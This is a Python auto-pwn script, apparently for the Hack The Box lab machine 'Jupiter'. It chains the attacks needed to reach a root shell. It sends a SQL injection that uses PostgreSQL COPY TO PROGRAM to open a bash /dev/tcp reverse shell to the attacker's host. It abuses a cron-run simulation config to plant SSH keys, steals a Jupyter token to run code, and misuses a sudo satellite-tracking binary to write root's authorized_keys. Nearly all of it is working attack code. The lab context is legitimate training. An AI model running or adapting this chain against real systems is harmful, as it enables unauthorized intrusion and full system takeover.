#!/usr/bin/python3

import requests
import json
from time import sleep
import time
import paramiko
from Crypto.PublicKey import RSA
from pwn import *
import subprocess
import sshtunnel
import io
import jupyter_actions
import sys
import ssh_interactive

# will perform everything needed to reach a root shell. This includes SQLi, ssh portforwarding, jupyter exploit, sattrack exploit

if len(sys.argv) != 3:
    log.info("Usage: ./auto_pwn.py <local ip for reverse shell> <local_port for reverse shell>")
    exit()


key = RSA.generate(2048)
private_key = key.exportKey('PEM')
public_key = key.publickey().exportKey('OpenSSH')
local_port_for_reverse_shell = int(sys.argv[2])
local_ip_for_reverse_shell = sys.argv[1]

with open("./id_rsa", "w") as f:
    f.write(private_key.decode())

import requests
import nbformat
import json
import time

def inject_postgress():
    log.info("Injecting postgres")
    sleep(2)
    url = "http://kiosk.jupiter.htb/api/ds/query"
    injection_rev_shell = f"'bash -c \"bash -i >& /dev/tcp/{local_ip_for_reverse_shell}/{int(local_port_for_reverse_shell)} 0>&1\"';"
    injection = f"copy (SELECT '') to program {injection_rev_shell}"
    json = {
                "queries": [
                    {
                    "rawSql": injection, 
                    "format": "table", 
                    "datasourceId": 1
                    }
                ]
            }

    response = requests.post(url, json=json)
    if response.status_code == 200:
        if response.json()['results']['A']['status'] == 200:
            log.success("Succesfully injected postgres")

def create_juno_payload():
    return f"""general:
  stop_time: 10s
  model_unblocked_syscall_latency: true

network:
  graph:
    type: 1_gbit_switch

hosts:
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: -f /dev/shm/authorized_keys /home/juno/.ssh/
      start_time: 3s
"""

def pivot_to_juno(conn):
    log.info("Got reverse shell callback. Setting up pivot to user juno")
    conn.recvuntil(b"$")
    payload = create_juno_payload()
    first = f"echo \"{public_key.decode()}\" > /dev/shm/authorized_keys"
    conn.sendline(first.encode())
    conn.sendline(b"/usr/bin/chmod 777 /dev/shm/authorized_keys")
    prep_payload = f"echo '{payload}' > /dev/shm/network-simulation.yml"
    conn.sendline(prep_payload.encode())
    conn.sendline(b"export TERM=screen")
    conn.sendline(b"cd /dev/shm")
    conn.sendline(b"clear")
    log.info("Done.")
    ssh_as_juno()

def ssh_as_juno():
    log.info("Attempting SSH and Tunnel as user juno. Remote cronjob every 2 minutes.")
    preform_ssh_tunnel()

def start_ssh_tunnel(pkey: paramiko.PKey, remote_address: tuple) -> sshtunnel.SSHTunnelForwarder:
    sshtunnel.DEFAULT_LOGLEVEL = 1000
    tunnel = sshtunnel.SSHTunnelForwarder(
        'jupiter.htb',
        ssh_username="juno",
        ssh_pkey=pkey,
        remote_bind_address=remote_address
    )
    
    tunnel.start()
    log.info(f"Port forward map:")

    for index, (remote, local) in enumerate(tunnel.tunnel_bindings.items()):
        log.info(f"[{index}] {remote[0]}:{remote[1]} -> {local[0]}:{local[1]}")
    return tunnel

def grab_jupyter_token(client: paramiko.SSHClient):
    log.info("Grabbing Jupyter token")
    stdin, stdout, stderr = client.exec_command('grep -oP "(?<=\?token=)[^\s]+" "$(ls -t /opt/solar-flares/logs/*.log | head -1)" | tail -n 1') 
    token = stdout.read().decode().strip()

    if token:
        log.success(f"We got a jupyter token: {token}")
    else:
        error = stderr.read().decode().strip()
        log.failure(f"Failed to get jupyter token with error [{error}]. Qutting")
        exit()
        return

    return token
        

def preform_ssh_tunnel():
    username = "juno"
    hostname = "jupiter.htb"
    local_port = 8888
    remote_host = "127.0.0.1"
    remote_port = 8888

    max_retries = 20
    retry_delay = 10

    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    retries = 0
    key = paramiko.RSAKey.from_private_key(io.StringIO(private_key.decode()))
    while retries < max_retries:
        try:
            client.connect(
                hostname,
                username=username,
                pkey=key,
                timeout=10,
                banner_timeout=200
            )

            log.success("SSH connection established successfully as juno")

            # Set up port forwarding
            remote_address = (remote_host, remote_port)
            tunnel = start_ssh_tunnel(key, remote_address=remote_address)
            local_address = tunnel.tunnel_bindings[remote_address]
            log.info(f"SSH tunnel on port: {local_address}")

            jupyter_token = grab_jupyter_token(client)
            
            code = f"import os; os.system('mkdir -p /home/jovian/.ssh; echo \"{public_key.decode()}\" > /home/jovian/.ssh/authorized_keys');"
            log.info("Exploiting jupyter webpage to plant ssh key for user jovian")
            jupyter_actions.exploit_jupyter(baseurl=remote_host, port=local_address[1], token=jupyter_token, payload=code)
            break

        except paramiko.AuthenticationException as pe:
            client.close()
            log.failure(f"Authentication attempt [{retries+1}] failed with error: [{str(pe)}]. Retrying in {retry_delay} seconds.")
            time.sleep(retry_delay)
            retries += 1
        except Exception as e:
            log.failure("An error occurred:", str(e))
            break

    client.close()

    if retries == max_retries:
        log.failure("Maximum number of retries reached. Failed to establish SSH connection.")
        exit()

    log.success("SSH key planted")
    pwn_root()

def pwn_root():
    log.info("SSH in as jovian and pwn sattrack binary")
    ssh_host = 'jupiter.htb'
    ssh_user = 'jovian'
    pkey = paramiko.RSAKey.from_private_key(io.StringIO(private_key.decode()))

    ssh_client = paramiko.Transport((ssh_host, 22))
    ssh_client.connect(username=ssh_user, pkey=pkey)
    shell = ssh_client.open_channel(kind='session')

    config_file = '''{
        "tleroot": "/root/.ssh/",
        "updatePerdiod": 1000,
        "station": {
            "name": "whatever",
            "lat": 1337.0,
            "lon": 10.333,
            "hgt": 1234.0
        },
        "mapfile": "/dev/null",
        "texturefile": "/dev/null",
        "tlesources": ["file:///home/jovian/.ssh/authorized_keys"],
        "tlefile": "whatever"
    }'''

    payload = f"echo '{config_file}' > /tmp/config.json; sudo /usr/local/bin/sattrack"
    shell.exec_command(payload)
    shell.close()
    ssh_client.close()
    log.success("Planted ssh key as root.")
    log.success("And now... the promissed land. You are root. You are a god. Enjoy.")
    ssh_interactive.connect(hostname=ssh_host, port=22, username="root", pkey=pkey)

def initiate_call_back(port:int):                                                                                                             
    log.info("Starting reverse shell listener in 4..3..2..1")                                                                          
    l = listen(port)                                                                                                                     
    conn = l.wait_for_connection()
    pivot_to_juno(conn)                                                                                                        

def start_callback_server(port):
    t = threading.Thread(target=initiate_call_back, args=(port,))
    t.start()

if __name__ == "__main__":
    start_callback_server(local_port_for_reverse_shell)
    inject_postgress()